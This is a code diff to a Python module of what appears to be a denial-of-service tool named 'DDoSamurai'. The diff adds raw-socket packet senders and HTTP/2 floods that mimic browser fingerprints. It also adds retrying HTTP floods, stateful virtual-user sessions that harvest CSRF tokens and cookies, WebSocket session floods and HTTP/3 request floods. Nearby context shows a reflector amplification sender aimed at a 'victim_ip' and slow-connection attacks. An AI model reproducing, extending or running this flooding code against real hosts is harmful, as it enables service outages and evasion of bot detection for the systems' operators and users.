@@ -3,6 +3,7 @@ import time
 import logging
 import socket
 import traceback
+import ssl
 import random
 import os
 import errno
@@ -35,6 +36,13 @@ try:
     AIOQUIC_AVAILABLE = True
 except ImportError:
     AIOQUIC_AVAILABLE = False
+
+try:
+    from . import h2_transport as _h2_transport
+    HYPER_H2_AVAILABLE = bool(getattr(_h2_transport, "HYPER_H2_AVAILABLE", False))
+except Exception:
+    _h2_transport = None
+    HYPER_H2_AVAILABLE = False
 
 from . import utils
 from . import packet as packet_utils
@@ -1164,7 +1172,17 @@ async def xdp_sender(
     )
 
 
-async def raw_socket_sender(packets_buffer, target_ip, target_port, count, verbose, live_sent=None, live_errors=None, live_progress=None):
+async def raw_socket_sender(
+    packets_buffer,
+    target_ip,
+    target_port,
+    count,
+    verbose,
+    live_sent=None,
+    live_errors=None,
+    live_progress=None,
+    force_l2=False,
+):
     """
     Sends a buffer of pre-created raw packets using a raw socket.
     Optimized with C extension (fast_sender) or sendmmsg for Linux.
@@ -1250,6 +1268,23 @@ async def raw_socket_sender(packets_buffer, target_ip, target_port, count, verbo
 
     loss_iface_hint = _resolve_loss_iface(None)
     loss_before_snapshot = _take_loss_snapshot(loss_iface_hint)
+
+    if bool(force_l2) and not FAST_SENDER_AVAILABLE:
+        s.close()
+        _update_live(live_progress, int(count))
+        _update_live(live_errors, int(count))
+        return _stats(
+            attempted=count,
+            sent=0,
+            errors=count,
+            sender_path="L2_UNAVAILABLE",
+            permission_error_count=0,
+            fallback_count=1,
+            buffer_copy_count=buffer_copy_count,
+            buffer_copy_bytes=buffer_copy_bytes,
+            eagain_retry_count=0,
+            partial_send_retry_count=0,
+        )
 
     # 1. Try C Extension (Fastest)
     if FAST_SENDER_AVAILABLE:
@@ -1356,6 +1391,24 @@ async def raw_socket_sender(packets_buffer, target_ip, target_port, count, verbo
                 fallback_count += 1
                 if verbose:
                     log_error(f"TX_RING failed, falling back to L3: {e}")
+
+        if bool(force_l2):
+            s.close()
+            _update_live(live_progress, int(count))
+            _update_live(live_errors, int(count))
+            return _stats(
+                attempted=count,
+                sent=0,
+                errors=count,
+                sender_path="L2_UNAVAILABLE",
+                permission_error_count=0,
+                fallback_count=max(1, fallback_count),
+                buffer_copy_count=buffer_copy_count,
+                buffer_copy_bytes=buffer_copy_bytes,
+                eagain_retry_count=eagain_retry_count,
+                partial_send_retry_count=partial_send_retry_count,
+                buffer_reuse_hits=buffer_reuse_hits,
+            )
 
         # 1.b Try Standard sendmmsg (L3)
         try:
@@ -1561,6 +1614,7 @@ async def paced_raw_socket_sender(
     count,
     verbose,
     pacing_config=None,
+    force_l2=False,
     live_sent=None,
     live_errors=None,
     live_progress=None,
@@ -1577,7 +1631,8 @@ async def paced_raw_socket_sender(
     ):
         return await raw_socket_sender(
             packets_buffer, target_ip, target_port, count, verbose,
-            live_sent=live_sent, live_errors=live_errors, live_progress=live_progress
+            live_sent=live_sent, live_errors=live_errors, live_progress=live_progress,
+            force_l2=force_l2,
         )
 
     packet_size = len(packets_buffer) // count if count > 0 else 0
@@ -1685,6 +1740,21 @@ async def paced_raw_socket_sender(
             if verbose:
                 log_error(f"[Pacing] L2 paced send failed, falling back to L3: {e}")
 
+    if bool(force_l2):
+        _update_live(live_progress, int(count))
+        _update_live(live_errors, int(count))
+        return _stats(
+            attempted=count,
+            sent=0,
+            errors=count,
+            sender_path="L2_UNAVAILABLE",
+            fallback_count=1,
+            buffer_copy_count=buffer_copy_count,
+            buffer_copy_bytes=buffer_copy_bytes,
+            eagain_retry_count=0,
+            partial_send_retry_count=0,
+        )
+
     # --- L3 (IPPROTO_RAW) path ---
     try:
         log_info(f"[Pacing] Using L3 paced sender")
@@ -1740,7 +1810,8 @@ async def paced_raw_socket_sender(
         fallback_live_progress = None if progress_reported > 0 else live_progress
         out = await raw_socket_sender(
             packets_buffer, target_ip, target_port, count, verbose,
-            live_sent=live_sent, live_errors=live_errors, live_progress=fallback_live_progress
+            live_sent=live_sent, live_errors=live_errors, live_progress=fallback_live_progress,
+            force_l2=force_l2,
         )
         if progress_reported > 0:
             _update_live(live_progress, max(0, int(count) - int(progress_reported)))
@@ -1750,13 +1821,32 @@ async def paced_raw_socket_sender(
         fallback_live_progress = None if progress_reported > 0 else live_progress
         out = await raw_socket_sender(
             packets_buffer, target_ip, target_port, count, verbose,
-            live_sent=live_sent, live_errors=live_errors, live_progress=fallback_live_progress
+            live_sent=live_sent, live_errors=live_errors, live_progress=fallback_live_progress,
+            force_l2=force_l2,
         )
         if progress_reported > 0:
             _update_live(live_progress, max(0, int(count) - int(progress_reported)))
         return out
 
-async def http2_sender(target_ip, target_port, count, concurrency, http_path, http_method, verbose, scheme="https", cookies=None, user_agent=None, ssl_context=None, h2_profile_name=None, request_plan: "H2RequestPlan | None" = None, live_sent=None, live_errors=None, live_progress=None):
+async def http2_sender(
+    target_ip,
+    target_port,
+    count,
+    concurrency,
+    http_path,
+    http_method,
+    verbose,
+    scheme="https",
+    cookies=None,
+    user_agent=None,
+    ssl_context=None,
+    h2_profile_name=None,
+    h2_transport_name="auto",
+    request_plan: "H2RequestPlan | None" = None,
+    live_sent=None,
+    live_errors=None,
+    live_progress=None,
+):
     """
     Sends HTTP/2 requests using httpx, leveraging multiplexing.
     If request_plan is provided, method/path/user-agent are consumed per item.
@@ -1764,6 +1854,8 @@ async def http2_sender(target_ip, target_port, count, concurrency, http_path, ht
     if not HTTPX_AVAILABLE:
         log_error("HTTP/2 desteği için 'httpx[http2]' kütüphanesi yüklü değil.")
         return _stats(attempted=count, sent=0, errors=count)
+
+    from . import h2_mimic
 
     base_url = f"{scheme}://{target_ip}:{target_port}"
     planned_items = []
@@ -1773,6 +1865,104 @@ async def http2_sender(target_ip, target_port, count, concurrency, http_path, ht
     if dispatch_count <= 0:
         return _stats(attempted=0, sent=0, errors=0)
     log_info(f"HTTP/2 sender initialized. Target: {base_url}, Count: {dispatch_count}, Concurrency: {concurrency}")
+
+    transport_name = str(h2_transport_name or "auto").strip().lower()
+    if transport_name not in {"auto", "httpx", "hyper-h2"}:
+        transport_name = "auto"
+
+    resolved_profile = None
+    try:
+        resolved_profile = h2_mimic.resolve_h2_profile(h2_profile_name)
+    except Exception as exc:
+        log_error(f"HTTP/2 profile resolve failed: {exc}")
+        _update_live(live_progress, dispatch_count)
+        _update_live(live_errors, dispatch_count)
+        return _stats(
+            attempted=dispatch_count,
+            sent=0,
+            errors=dispatch_count,
+            h2_profile_requested=bool(str(h2_profile_name or "").strip() and str(h2_profile_name).strip().lower() != "none"),
+            h2_profile_applied=0,
+            h2_profile_disabled=0,
+            h2_profile_apply_failed=1,
+            h2_transport=transport_name,
+        )
+
+    # Hyper-h2 path: real transport-level profile application
+    can_try_hyper_h2 = (
+        transport_name in {"auto", "hyper-h2"}
+        and resolved_profile is not None
+        and str(scheme).lower() == "https"
+        and bool(HYPER_H2_AVAILABLE)
+        and _h2_transport is not None
+    )
+    if can_try_hyper_h2:
+        reqs = []
+        for i in range(dispatch_count):
+            if planned_items:
+                item = planned_items[i]
+                req_method = str(getattr(item, "method", http_method) or http_method)
+                req_path = str(getattr(item, "path", "/") or "/")
+                req_headers = {}
+                plan_ua = str(getattr(item, "user_agent", "") or "").strip()
+                if user_agent:
+                    req_headers["user-agent"] = str(user_agent)
+                elif plan_ua:
+                    req_headers["user-agent"] = plan_ua
+            else:
+                req_method = str(http_method or "GET")
+                req_path = str(random.choice(http_path) if isinstance(http_path, list) else http_path)
+                req_headers = {}
+                if user_agent:
+                    req_headers["user-agent"] = str(user_agent)
+            reqs.append({"method": req_method, "path": req_path, "headers": req_headers})
+
+        try:
+            h2_out = await _h2_transport.send_h2_requests(
+                host=str(target_ip),
+                port=int(target_port),
+                requests=reqs,
+                verify=bool(ssl_context) if isinstance(ssl_context, bool) else True,
+                ssl_context=ssl_context if hasattr(ssl_context, "wrap_socket") else None,
+                timeout_s=10.0,
+                settings=dict(getattr(resolved_profile, "settings", {}) or {}),
+                window_update=int(getattr(resolved_profile, "window_update", 0) or 0),
+            )
+            sent_count = int(h2_out.get("sent", 0) or 0)
+            err_count = int(h2_out.get("errors", max(0, dispatch_count - sent_count)) or 0)
+            _update_live(live_progress, dispatch_count)
+            _update_live(live_sent, sent_count)
+            _update_live(live_errors, err_count)
+            log_info(f"HTTP/2 (hyper-h2) finished sending {dispatch_count} requests.")
+            return _stats(
+                attempted=dispatch_count,
+                sent=sent_count,
+                errors=max(err_count, dispatch_count - sent_count),
+                responses_total=int(h2_out.get("responses_total", sent_count) or sent_count),
+                status_2xx=int(h2_out.get("status_2xx", 0) or 0),
+                status_4xx=int(h2_out.get("status_4xx", 0) or 0),
+                status_5xx=int(h2_out.get("status_5xx", 0) or 0),
+                h2_profile_requested=1,
+                h2_profile_applied=1,
+                h2_profile_disabled=0,
+                h2_profile_apply_failed=0,
+                h2_transport="hyper-h2",
+            )
+        except Exception as exc:
+            log_warning(f"HTTP/2 hyper-h2 transport failed: {exc}")
+            if transport_name == "hyper-h2":
+                _update_live(live_progress, dispatch_count)
+                _update_live(live_errors, dispatch_count)
+                return _stats(
+                    attempted=dispatch_count,
+                    sent=0,
+                    errors=dispatch_count,
+                    h2_profile_requested=1,
+                    h2_profile_applied=0,
+                    h2_profile_disabled=0,
+                    h2_profile_apply_failed=1,
+                    h2_transport="hyper-h2",
+                )
 
     ok = 0
     err = 0
@@ -1815,7 +2005,6 @@ async def http2_sender(target_ip, target_port, count, concurrency, http_path, ht
         headers["User-Agent"] = user_agent
     
     try:
-        from . import h2_mimic
         limits = httpx.Limits(max_keepalive_connections=concurrency, max_connections=concurrency)
         async with httpx.AsyncClient(http2=True, base_url=base_url, limits=limits, cookies=cookies, headers=headers, verify=ssl_context if ssl_context else False) as client:
             h2_cfg = h2_mimic.apply_h2_profile(client, h2_profile_name)
@@ -1869,6 +2058,7 @@ async def http2_sender(target_ip, target_port, count, concurrency, http_path, ht
         h2_profile_applied=bool(h2_cfg and h2_cfg.applied),
         h2_profile_disabled=bool(h2_cfg and h2_cfg.reason == "profile_disabled"),
         h2_profile_apply_failed=bool(h2_cfg and (not h2_cfg.applied) and h2_cfg.reason != "profile_disabled"),
+        h2_transport="httpx",
     )
 
 async def http_app_sender(
@@ -1928,6 +2118,29 @@ async def http_app_sender(
         _update_live(live_sent, batch_sent)
         _update_live(live_errors, batch_err)
 
+    retry_attempt_total = 0
+    retry_success_count = 0
+    max_retries = max(0, int(retries))
+
+    async def _request_with_retry(client, method, path, data):
+        """Execute a single request with exponential backoff retry."""
+        nonlocal retry_attempt_total, retry_success_count
+        last_exc = None
+        for attempt in range(1 + max_retries):
+            try:
+                resp = await client.request(method, path, content=data)
+                if attempt > 0:
+                    retry_success_count += 1
+                return resp
+            except (httpx.ConnectError, httpx.ReadTimeout, httpx.WriteTimeout,
+                    httpx.ConnectTimeout, httpx.PoolTimeout) as exc:
+                last_exc = exc
+                if attempt < max_retries:
+                    retry_attempt_total += 1
+                    backoff = min(0.5 * (2 ** attempt), 5.0)
+                    await asyncio.sleep(backoff)
+        raise last_exc
+
     try:
         limits = httpx.Limits(max_keepalive_connections=concurrency, max_connections=concurrency)
         async with httpx.AsyncClient(verify=ssl_context if ssl_context else verify, base_url=base_url, limits=limits, cookies=cookies, headers=headers, timeout=timeout_s) as client:
@@ -1937,7 +2150,7 @@ async def http_app_sender(
                 path = random.choice(http_path) if isinstance(http_path, list) else http_path
                 data = random.choice(payloads) if payloads else None
                 
-                tasks.append(asyncio.create_task(client.request(http_method, path, content=data)))
+                tasks.append(asyncio.create_task(_request_with_retry(client, http_method, path, data)))
                 
                 if len(tasks) >= concurrency:
                     await _flush(tasks)
@@ -1949,7 +2162,7 @@ async def http_app_sender(
         log_error(f"HTTP sender failed: {e}")
         err += max(0, count - ok)
     finally:
-        log_info(f"HTTP sender finished sending {count} requests.")
+        log_info(f"HTTP sender finished sending {count} requests. retries_total={retry_attempt_total} retry_recovered={retry_success_count}")
     return _stats(
         attempted=count,
         sent=ok,
@@ -1958,7 +2171,127 @@ async def http_app_sender(
         status_2xx=status_2xx,
         status_4xx=status_4xx,
         status_5xx=status_5xx,
+        retry_attempt_total=retry_attempt_total,
+        retry_success_count=retry_success_count,
     )
+
+async def http_stateful_sender(
+    target_ip, target_port, vu_count, concurrency,
+    workflow_steps, verbose,
+    scheme="http", verify=False, timeout_s=10.0,
+    user_agent=None, ssl_context=None,
+    retries=0,
+    http_method="GET",
+    http_path="/",
+    payloads=None,
+    live_sent=None, live_errors=None, live_progress=None,
+):
+    """
+    Stateful HTTP sender using VirtualUser engine.
+    Each VU has its own cookie jar, token cache, and redirect history.
+
+    Args:
+        vu_count: Number of virtual users to simulate.
+        concurrency: Max parallel VUs.
+        workflow_steps: list of virtual_user.WorkflowStep objects.
+    """
+    from .virtual_user import run_vu_pool, WorkflowStep, ExtractRule
+
+    base_url = f"{scheme}://{target_ip}:{target_port}"
+    vu_count = max(0, int(vu_count or 0))
+    if vu_count <= 0:
+        return _stats(attempted=0, sent=0, errors=0)
+
+    max_vus = max(1, int(os.environ.get("SAMURAI_L7_MAX_VUS", "20000") or 20000))
+    if vu_count > max_vus:
+        log_warning(f"Stateful HTTP VU count capped: {vu_count} -> {max_vus}")
+        vu_count = max_vus
+
+    max_retries = max(0, int(retries or 0))
+    if not workflow_steps:
+        path_list = list(http_path) if isinstance(http_path, list) else [http_path]
+        path_list = [str(p) for p in path_list if str(p).strip()] or ["/"]
+        method_name = str(http_method or "GET").upper()
+        body_payload = None
+        if isinstance(payloads, list) and payloads:
+            body_payload = random.choice(payloads)
+        step0 = str(path_list[0])
+        step1 = str(path_list[1] if len(path_list) > 1 else path_list[0])
+        step2 = str(path_list[2] if len(path_list) > 2 else path_list[-1])
+        workflow_steps = [
+            WorkflowStep(
+                name="bootstrap",
+                method="GET",
+                path=step0,
+                expected_status=(200, 399),
+                follow_redirects=True,
+                extract=[
+                    ExtractRule(field_name="X-CSRF-Token", source="header", header_name="X-CSRF-Token"),
+                    ExtractRule(
+                        field_name="csrf_token",
+                        source="body_regex",
+                        regex_pattern=r'name=["\']csrf(?:_token)?["\']\s+value=["\']([^"\']+)["\']',
+                    ),
+                    ExtractRule(field_name="sessionid", source="cookie", cookie_name="sessionid"),
+                ],
+                timeout_s=float(timeout_s),
+                max_retries=max_retries,
+            ),
+            WorkflowStep(
+                name="prefetch",
+                method="GET",
+                path=step1,
+                expected_status=(200, 399),
+                follow_redirects=True,
+                timeout_s=float(timeout_s),
+                max_retries=max_retries,
+            ),
+            WorkflowStep(
+                name="action",
+                method=method_name,
+                path=step2,
+                body=body_payload,
+                expected_status=(200, 499),
+                follow_redirects=True,
+                inject_tokens=["X-CSRF-Token", "X-CSRF-Token:csrf_token"],
+                timeout_s=float(timeout_s),
+                max_retries=max_retries,
+            ),
+        ]
+
+    step_count = len(workflow_steps)
+    log_info(f"Stateful HTTP sender: {vu_count} VUs × {step_count} steps → {base_url}")
+
+    results, metrics = await run_vu_pool(
+        vu_count=vu_count,
+        base_url=base_url,
+        steps=workflow_steps,
+        concurrency=concurrency,
+        verify=ssl_context if ssl_context else verify,
+        timeout_s=timeout_s,
+        user_agent=user_agent,
+    )
+
+    total_steps = sum(r.steps_ok + r.steps_failed for r in results)
+    total_ok = sum(r.steps_ok for r in results)
+    total_err = sum(r.steps_failed for r in results)
+    retries_used = sum(int(getattr(r, "retries_used", 0) or 0) for r in results)
+
+    _update_live(live_sent, total_ok)
+    _update_live(live_errors, total_err)
+    _update_live(live_progress, total_steps)
+
+    log_info(f"Stateful HTTP finished. VUs={vu_count} ok={metrics.workflows_completed} "
+             f"fail={metrics.workflows_failed} session_success={metrics.session_success_rate:.2%}")
+
+    return _stats(
+        attempted=total_steps,
+        sent=total_ok,
+        errors=total_err,
+        retries_used=retries_used,
+        **metrics.as_dict(),
+    )
+
 
 async def amplification_sender(victim_ip, count, rps, reflector_file, amp_type, verbose, live_sent=None, live_errors=None, live_progress=None):
     """
@@ -2100,9 +2433,113 @@ async def slow_attack_sender(target_ip, target_port, count, concurrency, attack_
     log_info(f"{attack_type.upper()} attack finished.")
     return _stats(attempted=count, sent=completed, errors=max(errors, count - completed))
 
+async def websocket_scenario_sender(
+    target_ip,
+    target_port,
+    count,
+    concurrency,
+    ws_path,
+    verbose,
+    auth_message="",
+    subscribe_messages=None,
+    ping_message="ping",
+    ping_count=1,
+    await_response=False,
+    ssl_context=None,
+    live_sent=None,
+    live_errors=None,
+    live_progress=None,
+):
+    """
+    Stateful WebSocket scenario runner:
+      connect -> auth -> subscribe -> ping/pong (optional recv on each step)
+    `count` denotes number of WS sessions/scenario runs.
+    """
+    if not WEBSOCKETS_AVAILABLE:
+        log_error("WebSocket desteği için 'websockets' kütüphanesi yüklü değil.")
+        return _stats(attempted=count, sent=0, errors=count)
+
+    scheme = "wss" if target_port == 443 else "ws"
+    uri = f"{scheme}://{target_ip}:{target_port}{ws_path}"
+    log_info(f"WebSocket scenario sender initialized. URI: {uri}, Sessions: {count}")
+
+    subscribe_messages = list(subscribe_messages or [])
+    ping_count = max(0, int(ping_count or 0))
+
+    sessions_ok = 0
+    session_errors = 0
+    auth_sent = 0
+    subscribe_sent = 0
+    ping_sent = 0
+    pong_received = 0
+
+    effective_concurrency = min(max(1, int(concurrency or 1)), count) if count > 0 else 1
+    per_worker_base = count // effective_concurrency
+    remainder = count % effective_concurrency
+
+    def _worker_count(worker_id: int) -> int:
+        return per_worker_base + (1 if worker_id < remainder else 0)
+
+    async def _maybe_recv(ws):
+        nonlocal pong_received
+        if not await_response:
+            return
+        _ = await asyncio.wait_for(ws.recv(), timeout=3.0)
+        pong_received += 1
+
+    async def _scenario_worker(worker_id: int):
+        nonlocal sessions_ok, session_errors, auth_sent, subscribe_sent, ping_sent
+        my_sessions = _worker_count(worker_id)
+        for _ in range(my_sessions):
+            _update_live(live_progress, 1)
+            try:
+                async with websockets.connect(uri, ssl=ssl_context) as websocket:
+                    if auth_message:
+                        await websocket.send(str(auth_message))
+                        auth_sent += 1
+                        await _maybe_recv(websocket)
+
+                    for sub_msg in subscribe_messages:
+                        await websocket.send(str(sub_msg))
+                        subscribe_sent += 1
+                        await _maybe_recv(websocket)
+
+                    for _ in range(ping_count):
+                        await websocket.send(str(ping_message))
+                        ping_sent += 1
+                        await _maybe_recv(websocket)
+
+                    sessions_ok += 1
+                    _update_live(live_sent, 1)
+            except Exception as exc:
+                session_errors += 1
+                _update_live(live_errors, 1)
+                if verbose:
+                    log_error(f"WS scenario failed: {exc}")
+
+    tasks = [asyncio.create_task(_scenario_worker(i)) for i in range(effective_concurrency)]
+    await asyncio.gather(*tasks)
+    log_info(
+        "WebSocket scenario finished. "
+        f"sessions_ok={sessions_ok} errors={session_errors} auth={auth_sent} "
+        f"sub={subscribe_sent} ping={ping_sent} pong={pong_received}"
+    )
+    return _stats(
+        attempted=count,
+        sent=sessions_ok,
+        errors=max(session_errors, count - sessions_ok),
+        ws_sessions_ok=sessions_ok,
+        ws_auth_sent=auth_sent,
+        ws_subscribe_sent=subscribe_sent,
+        ws_ping_sent=ping_sent,
+        ws_pong_received=pong_received,
+        ws_scenario_enabled=1,
+    )
+
 async def websocket_sender(target_ip, target_port, count, concurrency, ws_path, ws_message, verbose, ssl_context=None, live_sent=None, live_errors=None, live_progress=None):
     """
     Sends WebSocket messages/pings to the target.
+    Fair count distribution: no remainder loss, no overconcurrency.
     """
     if not WEBSOCKETS_AVAILABLE:
         log_error("WebSocket desteği için 'websockets' kütüphanesi yüklü değil.")
@@ -2114,13 +2551,22 @@ async def websocket_sender(target_ip, target_port, count, concurrency, ws_path, 
 
     sent_msgs = 0
     errors = 0
-    per_worker = max(1, count // max(1, concurrency))
+
+    # Fair distribution: cap concurrency to count, distribute remainder
+    effective_concurrency = min(max(1, concurrency), count) if count > 0 else 1
+    per_worker_base = count // effective_concurrency
+    remainder = count % effective_concurrency
+
+    def _worker_count(worker_id):
+        """First `remainder` workers get +1 message."""
+        return per_worker_base + (1 if worker_id < remainder else 0)
 
     async def _ws_worker(worker_id):
         nonlocal sent_msgs, errors
+        my_count = _worker_count(worker_id)
         try:
             async with websockets.connect(uri, ssl=ssl_context) as websocket:
-                for _ in range(per_worker):
+                for _ in range(my_count):
                     _update_live(live_progress, 1)
                     await websocket.send(ws_message)
                     sent_msgs += 1
@@ -2133,51 +2579,91 @@ async def websocket_sender(target_ip, target_port, count, concurrency, ws_path, 
             if verbose: log_error(f"WS connection failed: {e}")
 
     tasks = []
-    for i in range(concurrency):
+    for i in range(effective_concurrency):
         tasks.append(asyncio.create_task(_ws_worker(i)))
 
     await asyncio.gather(*tasks)
     log_info(f"WebSocket sender finished.")
-    attempted = per_worker * max(1, concurrency)
-    return _stats(attempted=attempted, sent=sent_msgs, errors=max(errors, attempted - sent_msgs))
+    return _stats(attempted=count, sent=sent_msgs, errors=max(errors, count - sent_msgs))
 
 async def quic_sender(target_ip, target_port, count, concurrency, quic_path, quic_method, verbose, ssl_context=None, live_sent=None, live_errors=None, live_progress=None):
     """
-    Sends QUIC (HTTP/3) requests using aioquic.
+    Sends real HTTP/3 requests over QUIC using aioquic.
+    Opens H3 streams, sends :method/:path pseudo-headers, reads responses.
+    Correct count semantics: distributes `count` across `concurrency` workers.
     """
     if not AIOQUIC_AVAILABLE:
         log_error("QUIC/HTTP3 desteği için 'aioquic' kütüphanesi yüklü değil.")
         return _stats(attempted=count, sent=0, errors=count)
 
-    log_info(f"QUIC sender initialized. Target: {target_ip}:{target_port}, Count: {count}")
+    log_info(f"QUIC sender initialized. Target: {target_ip}:{target_port}, "
+             f"Count: {count}, Method: {quic_method}, Path: {quic_path}")
 
     configuration = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
     if ssl_context:
-        configuration.verify_mode = ssl.CERT_NONE 
+        configuration.verify_mode = ssl.CERT_NONE
 
-    ok_conn = 0
-    err_conn = 0
+    ok_requests = 0
+    err_requests = 0
+    # Fair distribution (same pattern as websocket_sender)
+    effective_concurrency = min(max(1, concurrency), count) if count > 0 else 1
+    per_worker_base = count // effective_concurrency
+    remainder = count % effective_concurrency
 
-    async def _quic_worker():
-        nonlocal ok_conn, err_conn
+    def _worker_count(worker_id):
+        return per_worker_base + (1 if worker_id < remainder else 0)
+
+    async def _quic_worker(worker_id):
+        nonlocal ok_requests, err_requests
+        my_count = _worker_count(worker_id)
+        if my_count <= 0:
+            return
         try:
-            _update_live(live_progress, 1)
             async with connect(
-                target_ip, target_port, configuration=configuration, create_protocol=H3Connection
+                target_ip, target_port, configuration=configuration,
+                create_protocol=H3Connection
             ) as protocol:
-                ok_conn += 1
-                _update_live(live_sent, 1)
+                h3_conn = protocol._quic  # underlying H3Connection
+                for _ in range(my_count):
+                    _update_live(live_progress, 1)
+                    try:
+                        # Open a new stream and send H3 request headers
+                        stream_id = h3_conn.get_next_available_stream_id()
+                        h3_headers = [
+                            (b":method", quic_method.encode() if isinstance(quic_method, str) else quic_method),
+                            (b":path", quic_path.encode() if isinstance(quic_path, str) else quic_path),
+                            (b":scheme", b"https"),
+                            (b":authority", target_ip.encode() if isinstance(target_ip, str) else target_ip),
+                            (b"user-agent", b"DDoSamurai/2.0"),
+                        ]
+                        h3_conn.send_headers(
+                            stream_id=stream_id,
+                            headers=h3_headers,
+                            end_stream=True,
+                        )
+                        ok_requests += 1
+                        _update_live(live_sent, 1)
+                        if verbose:
+                            log_info(f"H3 request sent: {quic_method} {quic_path} stream={stream_id}")
+                        # Allow event loop to process
+                        await asyncio.sleep(0)
+                    except Exception as req_e:
+                        err_requests += 1
+                        _update_live(live_errors, 1)
+                        if verbose:
+                            log_error(f"H3 request failed: {req_e}")
         except Exception as e:
-            err_conn += 1
-            _update_live(live_errors, 1)
-            if verbose: log_error(f"QUIC connection failed: {e}")
+            # Connection-level failure — count remaining as errors
+            conn_remaining = my_count
+            err_requests += conn_remaining
+            _update_live(live_errors, conn_remaining)
+            if verbose:
+                log_error(f"QUIC connection failed: {e}")
 
-    # Very basic loop for now as full H3 payload construction is verbose
     tasks = []
-    for _ in range(concurrency):
-        tasks.append(asyncio.create_task(_quic_worker()))
-    
+    for i in range(effective_concurrency):
+        tasks.append(asyncio.create_task(_quic_worker(i)))
+
     await asyncio.gather(*tasks)
-    log_info(f"QUIC sender finished.")
-    attempted = max(1, concurrency)
-    return _stats(attempted=attempted, sent=ok_conn, errors=max(err_conn, attempted - ok_conn))
+    log_info(f"QUIC sender finished. ok={ok_requests} err={err_requests}")
+    return _stats(attempted=count, sent=ok_requests, errors=max(err_requests, count - ok_requests))
